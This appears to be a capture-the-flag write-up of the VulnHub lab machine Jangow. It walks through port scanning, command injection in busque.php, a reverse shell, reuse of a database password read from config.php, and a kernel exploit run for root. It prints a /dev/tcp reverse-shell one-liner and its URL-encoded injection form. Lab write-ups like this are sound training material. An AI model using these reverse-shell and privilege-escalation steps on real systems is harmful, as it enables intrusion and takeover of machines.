---
title: Jangow - Writeup
author: Elman Alizadeh
date: 2022-05-25 20:00:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, jangow]
---

Today we will take a look at Vulnhub: Jangow. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-jangow/1.png" | relative_url }})

## Network scan

```console
nmap -p- -sV -sC -oN result/nmap/log.txt --open 192.168.0.110

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-06-10 18:05  site/
|_
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 3C:A0:67:C5:35:33 (Liteon Technology)
Service Info: Host: 127.0.0.1; OS: Unix
```

## Web

http://192.168.0.110/site/busque.php?buscar=ls

![Desktop View]({{ "/assets/img/vuln-jangow/2.png" | relative_url }})

## Reverse Shell

[Reverse_Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

```console
/bin/bash -l > /dev/tcp/192.168.0.107/443 0<&1 2>&1
```
we need to encode the url as we will execute in the url section

[Url_encode](https://www.urlencoder.org/)

```console
%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.107%2F80%200%3E%261%20%27
```

## jangow01

Command: cat wordpress/config.php

```console
<?php
$servername = "localhost";
$database = "desafio02";
$username = "desafio02";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
?>
```

Command: su jangow01

## Root

Command: uname -a

```console
Linux jangow01 4.4.0-31-generic
```

[Exploit](https://www.exploit-db.com/exploits/45010)

```console
jangow01@jangow01:/tmp$ nano exploit.c

jangow01@jangow01:/tmp$ gcc exploit.c -o exploit

jangow01@jangow01:/tmp$ ./exploit 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88003bb8b900
[*] Leaking sock struct from ffff880037952000
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880034d0ae40
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff880034d0ae40
[*] credentials patched, launching shell...
# /bin/bash -i
root@jangow01:/tmp# cd /root

root@jangow01:/root# ls
proof.txt

root@jangow01:/root# cat proof.txt
```

![Desktop View]({{ "/assets/img/vuln-jangow/3.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-jangow/4.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”